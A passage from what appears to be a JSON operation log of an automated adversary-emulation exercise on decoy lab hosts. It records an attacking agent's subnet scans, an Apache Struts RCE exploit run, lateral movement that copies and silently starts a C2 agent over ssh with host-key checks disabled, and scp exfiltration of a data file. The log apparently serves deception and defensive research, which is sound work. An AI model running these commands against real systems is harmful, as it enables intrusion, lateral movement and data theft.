"parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "decoy-1", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:45:31Z"}, {"id": "7d4eedbe-7026-41e9-9d6c-f07178ae341c", "paw": "czljvk", "command": "python3 strutsExploit.py 192.168.201.90:8080 http://10.20.20.1:8888", "plaintext_command": "python3 strutsExploit.py 192.168.201.90:8080 http://10.20.20.1:8888", "status": 0, "score": 3, "decide": "2024-04-26T23:45:31Z", "pin": 0, "pid": "1495", "facts": [], "relationships": [], "used": [{"unique": "host.lateralMove.ip192.168.201.90", "trait": "host.lateralMove.ip", "name": "host.lateralMove.ip", "value": "192.168.201.90", "created": "2024-04-26T23:45:31Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["czljvk"], "technique_id": null}, {"unique": "host.lateralMove.port8080", "trait": "host.lateralMove.port", "name": "host.lateralMove.port", "value": 8080, "created": "2024-04-26T23:45:31Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["czljvk"], "technique_id": null}], "unique": "7d4eedbe-7026-41e9-9d6c-f07178ae341c", "collect": "2024-04-26T23:45:33Z", "finish": "2024-04-26T23:45:35Z", "ability": {"ability_id": "deception-struts", "tactic": "deception-lateral-movement", "technique_name": "Struts", "technique_id": "T9061", "name": "Exploit Apache Struts RCE", "description": "Copies agent to target using Apache Struts RCE", "executors": [{"name": "sh", "platform": "linux", "command": "python3 strutsExploit.py #{host.lateralMove.ip}:#{host.lateralMove.port} #{server}", "code": null, "language": null, "build_target": null, "payloads": ["strutsExploit.py"], "uploads": [], "timeout": 30, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-lateral-movement"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "python3 strutsExploit.py #{host.lateralMove.ip}:#{host.lateralMove.port} #{server}", "code": null, "language": null, "build_target": null, "payloads": ["strutsExploit.py"], "uploads": [], "timeout": 30, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-b", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:45:33Z"}, {"id": "6b328f4f-24fa-4264-b95e-33f7045b8d13", "paw": "jyirhn", "command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "plaintext_command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "status": 1, "score": 0, "decide": "2024-04-26T23:45:36Z", "pin": 0, "pid": "5699", "facts": [], "relationships": [], "used": [], "unique": "6b328f4f-24fa-4264-b95e-33f7045b8d13", "collect": "2024-04-26T23:45:38Z", "finish": "2024-04-26T23:45:38Z", "ability": {"ability_id": "deception-parse-sshconfig", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Parse SSH Config", "description": "Uses stormssh to parse the ssh config file", "executors": [{"name": "sh", "platform": "linux", "command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.ssh", "parserconfigs": [{"source": "remote.ssh.cmd", "edge": "", "target": "", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.ssh", "parserconfigs": [{"source": "remote.ssh.cmd", "edge": "", "target": "", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "decoy-0", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:45:38Z"}, {"id": "0473c7dc-bdbc-47eb-882b-216d0a0e5402", "paw": "jyirhn", "command": "ls -l /home/tomcat/", "plaintext_command": "ls -l /home/tomcat/", "status": 0, "score": 1, "decide": "2024-04-26T23:45:41Z", "pin": 0, "pid": "5701", "facts": [{"unique": "host.dir.path/home/tomcat/", "trait": "host.dir.path", "name": "host.dir.path", "value": "/home/tomcat/", "created": "2024-04-26T23:45:41Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": ["0473c7dc-bdbc-47eb-882b-216d0a0e5402"], "relationships": ["host.dir.path(/home/tomcat/) : has_contents : host.dir.files(['/home/tomcat/splunkd'])"], "limit_count": -1, "collected_by": ["jyirhn"], "technique_id": null}, {"unique": "host.dir.files['/home/tomcat/splunkd']", "trait": "host.dir.files", "name": "host.dir.files", "value": ["/home/tomcat/splunkd"], "created": "2024-04-26T23:40:57Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["bc961b42-1eed-492c-bc9e-9491fe7ce6d0", "fe2f6f79-c116-48b3-9fd3-20947b3992db", "76974f3a-6a64-46a0-a73c-baeff3fc0cf4", "ad7463f9-d256-4ec9-8995-e54deeab4ac5", "0473c7dc-bdbc-47eb-882b-216d0a0e5402"], "relationships": ["host.dir.path(/home/tomcat/) : has_contents : host.dir.files(['/home/tomcat/splunkd'])"], "limit_count": -1, "collected_by": ["czljvk", "cxfxwj", "dagwxr", "gbimmx", "jyirhn"], "technique_id": "T9012"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4dd6350>has_contents<app.objects.secondclass.c_fact.Fact object at 0x7f5cf464b550>", "source": {"unique": "host.dir.path/home/tomcat/", "trait": "host.dir.path", "name": "host.dir.path", "value": "/home/tomcat/", "created": "2024-04-26T23:45:41Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": ["0473c7dc-bdbc-47eb-882b-216d0a0e5402"], "relationships": ["host.dir.path(/home/tomcat/) : has_contents : host.dir.files(['/home/tomcat/splunkd'])"], "limit_count": -1, "collected_by": ["jyirhn"], "technique_id": null}, "edge": "has_contents", "target": {"unique": "host.dir.files['/home/tomcat/splunkd']", "trait": "host.dir.files", "name": "host.dir.files", "value": ["/home/tomcat/splunkd"], "created": "2024-04-26T23:45:46Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "host.dir.path/home/tomcat/", "trait": "host.dir.path", "name": "host.dir.path", "value": "/home/tomcat/", "created": "2024-04-26T23:45:41Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": ["0473c7dc-bdbc-47eb-882b-216d0a0e5402"], "relationships": ["host.dir.path(/home/tomcat/) : has_contents : host.dir.files(['/home/tomcat/splunkd'])"], "limit_count": -1, "collected_by": ["jyirhn"], "technique_id": null}], "unique": "0473c7dc-bdbc-47eb-882b-216d0a0e5402", "collect": "2024-04-26T23:45:46Z", "finish": "2024-04-26T23:45:46Z", "ability": {"ability_id": "deception-ls", "tactic": "utility", "technique_name": "Deception Enum Folders", "technique_id": "T9012", "name": "Enumerate all folders withing a directory", "description": "Enumerates all folders within a directory", "executors": [{"name": "sh", "platform": "linux", "command": "ls -l #{host.dir.path}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 15, "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"source": "host.dir.path", "edge": "has_children", "target": "host.dir.contents", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["utility"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "ls -l #{host.dir.path}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 15, "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"source": "host.dir.path", "edge": "has_children", "target": "host.dir.contents", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "decoy-0", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:45:46Z"}, {"id": "3160dbbb-0291-4d02-85a0-144882203d52", "paw": "jyirhn", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.202.0/24", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.202.0/24", "status": 1, "score": 1, "decide": "2024-04-26T23:45:46Z", "pin": 0, "pid": "5703", "facts": [], "relationships": [], "used": [{"unique": "scan.subnet.addr192.168.202.0/24", "trait": "scan.subnet.addr", "name": "scan.subnet.addr", "value": "192.168.202.0/24", "created": "2024-04-26T23:45:46Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "3160dbbb-0291-4d02-85a0-144882203d52", "collect": "2024-04-26T23:45:54Z", "finish": "2024-04-26T23:45:54Z", "ability": {"ability_id": "deception-nmapsubnet", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "executors": [{"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "decoy-0", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:45:54Z"}, {"id": "9663d5dd-2d1f-4531-87a1-e7b2d2ebd27c", "paw": "jyirhn", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "status": 1, "score": 1, "decide": "2024-04-26T23:45:56Z", "pin": 0, "pid": "5704", "facts": [], "relationships": [], "used": [{"unique": "scan.subnet.addr192.168.200.0/24", "trait": "scan.subnet.addr", "name": "scan.subnet.addr", "value": "192.168.200.0/24", "created": "2024-04-26T23:45:56Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "9663d5dd-2d1f-4531-87a1-e7b2d2ebd27c", "collect": "2024-04-26T23:46:02Z", "finish": "2024-04-26T23:46:02Z", "ability": {"ability_id": "deception-nmapsubnet", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "executors": [{"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "decoy-0", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:46:02Z"}, {"id": "0ee9b2a8-5c08-4a8e-82c2-31056e100810", "paw": "jyirhn", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "status": 1, "score": 1, "decide": "2024-04-26T23:46:06Z", "pin": 0, "pid": "5705", "facts": [], "relationships": [], "used": [{"unique": "scan.subnet.addr192.168.201.0/24", "trait": "scan.subnet.addr", "name": "scan.subnet.addr", "value": "192.168.201.0/24", "created": "2024-04-26T23:46:06Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "0ee9b2a8-5c08-4a8e-82c2-31056e100810", "collect": "2024-04-26T23:46:10Z", "finish": "2024-04-26T23:46:10Z", "ability": {"ability_id": "deception-nmapsubnet", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "executors": [{"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "decoy-0", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:46:10Z"}, {"id": "3b91382e-8816-49be-a61d-c61012d6a11d", "paw": "dagwxr", "command": "scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux databaseB@192.168.201.6:~/sandcat.go && ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 databaseB@192.168.201.6 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "plaintext_command": "scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux databaseB@192.168.201.6:~/sandcat.go && ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 databaseB@192.168.201.6 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "status": 0, "score": 7, "decide": "2024-04-26T23:46:11Z", "pin": 0, "pid": "1503", "facts": [], "relationships": [], "used": [{"unique": "host.lateralMove.ip192.168.201.6", "trait": "host.lateralMove.ip", "name": "host.lateralMove.ip", "value": "192.168.201.6", "created": "2024-04-26T23:46:11Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["dagwxr"], "technique_id": null}, {"unique": "host.lateralMove.userdatabaseB", "trait": "host.lateralMove.user", "name": "host.lateralMove.user", "value": "databaseB", "created": "2024-04-26T23:46:11Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["dagwxr"], "technique_id": null}, {"unique": "host.lateralMove.port22", "trait": "host.lateralMove.port", "name": "host.lateralMove.port", "value": "22", "created": "2024-04-26T23:46:11Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["dagwxr"], "technique_id": null}], "unique": "3b91382e-8816-49be-a61d-c61012d6a11d", "collect": "2024-04-26T23:46:17Z", "finish": "2024-04-26T23:46:19Z", "ability": {"ability_id": "deception-ssh-copy", "tactic": "deception-lateral-movement", "technique_name": "Remote Services: SSH", "technique_id": "T1021.004", "name": "Deception copy and start agent over ssh (passwordless)", "description": "Copy 54ndc47 to remote host and start it", "executors": [{"name": "sh", "platform": "linux", "command": "scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "code": null, "language": null, "build_target": null, "payloads": ["sandcat.go-linux"], "uploads": [], "timeout": 15, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-lateral-movement"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "code": null, "language": null, "build_target": null, "payloads": ["sandcat.go-linux"], "uploads": [], "timeout": 15, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-c", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:46:17Z"}, {"id": "459aed41-8122-4c89-805e-af3a11332687", "paw": "etrrtg", "command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "plaintext_command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "status": 0, "score": 0, "decide": "2024-04-26T23:46:27Z", "pin": 0, "pid": "1114", "facts": [], "relationships": [], "used": [], "unique": "459aed41-8122-4c89-805e-af3a11332687", "collect": "2024-04-26T23:46:27Z", "finish": "2024-04-26T23:46:35Z", "ability": {"ability_id": "deception-parse-sshconfig", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Parse SSH Config", "description": "Uses stormssh to parse the ssh config file", "executors": [{"name": "sh", "platform": "linux", "command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.ssh", "parserconfigs": [{"source": "remote.ssh.cmd", "edge": "", "target": "", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.ssh", "parserconfigs": [{"source": "remote.ssh.cmd", "edge": "", "target": "", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "database-b", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:46:27Z"}, {"id": "2f89c533-5ade-4b32-8ac8-9b446b94089d", "paw": "etrrtg", "command": "ls -l /home/databaseB/", "plaintext_command": "ls -l /home/databaseB/", "status": 0, "score": 1, "decide": "2024-04-26T23:46:37Z", "pin": 0, "pid": "1133", "facts": [{"unique": "host.dir.path/home/databaseB/", "trait": "host.dir.path", "name": "host.dir.path", "value": "/home/databaseB/", "created": "2024-04-26T23:46:37Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": ["2f89c533-5ade-4b32-8ac8-9b446b94089d"], "relationships": ["host.dir.path(/home/databaseB/) : has_contents : host.dir.files(['/home/databaseB/data2.json', '/home/databaseB/sandcat.go'])"], "limit_count": -1, "collected_by": ["etrrtg"], "technique_id": null}, {"unique": "host.dir.files['/home/databaseB/data2.json', '/home/databaseB/sandcat.go']", "trait": "host.dir.files", "name": "host.dir.files", "value": ["/home/databaseB/data2.json", "/home/databaseB/sandcat.go"], "created": "2024-04-26T23:46:40Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["2f89c533-5ade-4b32-8ac8-9b446b94089d"], "relationships": ["host.dir.path(/home/databaseB/) : has_contents : host.dir.files(['/home/databaseB/data2.json', '/home/databaseB/sandcat.go'])"], "limit_count": -1, "collected_by": ["etrrtg"], "technique_id": "T9012"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4a2ffd0>has_contents<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4989c60>", "source": {"unique": "host.dir.path/home/databaseB/", "trait": "host.dir.path", "name": "host.dir.path", "value": "/home/databaseB/", "created": "2024-04-26T23:46:37Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": ["2f89c533-5ade-4b32-8ac8-9b446b94089d"], "relationships": ["host.dir.path(/home/databaseB/) : has_contents : host.dir.files(['/home/databaseB/data2.json', '/home/databaseB/sandcat.go'])"], "limit_count": -1, "collected_by": ["etrrtg"], "technique_id": null}, "edge": "has_contents", "target": {"unique": "host.dir.files['/home/databaseB/data2.json', '/home/databaseB/sandcat.go']", "trait": "host.dir.files", "name": "host.dir.files", "value": ["/home/databaseB/data2.json", "/home/databaseB/sandcat.go"], "created": "2024-04-26T23:46:40Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "host.dir.path/home/databaseB/", "trait": "host.dir.path", "name": "host.dir.path", "value": "/home/databaseB/", "created": "2024-04-26T23:46:37Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": ["2f89c533-5ade-4b32-8ac8-9b446b94089d"], "relationships": ["host.dir.path(/home/databaseB/) : has_contents : host.dir.files(['/home/databaseB/data2.json', '/home/databaseB/sandcat.go'])"], "limit_count": -1, "collected_by": ["etrrtg"], "technique_id": null}], "unique": "2f89c533-5ade-4b32-8ac8-9b446b94089d", "collect": "2024-04-26T23:46:40Z", "finish": "2024-04-26T23:46:40Z", "ability": {"ability_id": "deception-ls", "tactic": "utility", "technique_name": "Deception Enum Folders", "technique_id": "T9012", "name": "Enumerate all folders withing a directory", "description": "Enumerates all folders within a directory", "executors": [{"name": "sh", "platform": "linux", "command": "ls -l #{host.dir.path}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 15, "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"source": "host.dir.path", "edge": "has_children", "target": "host.dir.contents", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["utility"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "ls -l #{host.dir.path}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 15, "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"source": "host.dir.path", "edge": "has_children", "target": "host.dir.contents", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "database-b", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:46:40Z"}, {"id": "56e5713f-6f5b-484b-a9cd-8c9f1469e8fe", "paw": "dagwxr", "command": "scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 databaseB@192.168.201.6:/home/databaseB/data2.json /opt/tomcat/webapps/ROOT/data2.json", "plaintext_command": "scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 databaseB@192.168.201.6:/home/databaseB/data2.json /opt/tomcat/webapps/ROOT/data2.json", "status": 0, "score": 31, "decide": "2024-04-26T23:46:42Z", "pin": 0, "pid": "1507", "facts": [], "relationships": [], "used": [{"unique": "host.data.ip192.168.201.6", "trait": "host.data.ip", "name": "host.data.ip", "value": "192.168.201.6", "created": "2024-04-26T23:46:42Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["dagwxr"], "technique_id": null}, {"unique": "host.data.filepath/home/databaseB/data2.json", "trait": "host.data.filepath", "name": "host.data.filepath", "value": "/home/databaseB/data2.json", "created": "2024-04-26T23:46:42Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["dagwxr"], "technique_id": null}, {"unique": "host.data.userdatabaseB", "trait": "host.data.user", "name": "host.data.user", "value": "databaseB", "created": "2024-04-26T23:46:42Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["dagwxr"], "technique_id": null}, {"unique": "host.data.port22", "trait": "host.data.port", "name": "host.data.port", "value": "22", "created": "2024-04-26T23:46:42Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["dagwxr"], "technique_id": null}, {"unique": "host.data.dst-filepath/opt/tomcat/webapps/ROOT/data2.json", "trait": "host.data.dst-filepath", "name": "host.data.dst-filepath", "value": "/opt/tomcat/webapps/ROOT/data2.json", "created": "2024-04-26T23:46:42Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["dagwxr"], "technique_id": null}], "unique": "56e5713f-6f5b-484b-a9cd-8c9f1469e8fe", "collect": "2024-04-26T23:46:45Z", "finish": "2024-04-26T23:46:46Z", "ability": {"ability_id": "deception-scp-copy", "tactic": "deception-data-exfiltration", "technique_name": "Remote Services: SSH", "technique_id": "T1021.004", "name": "Copy file using scp", "description": "Copy file using scp", "executors": [{"name": "sh", "platform": "linux", "command": "scp -P #{host.data.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 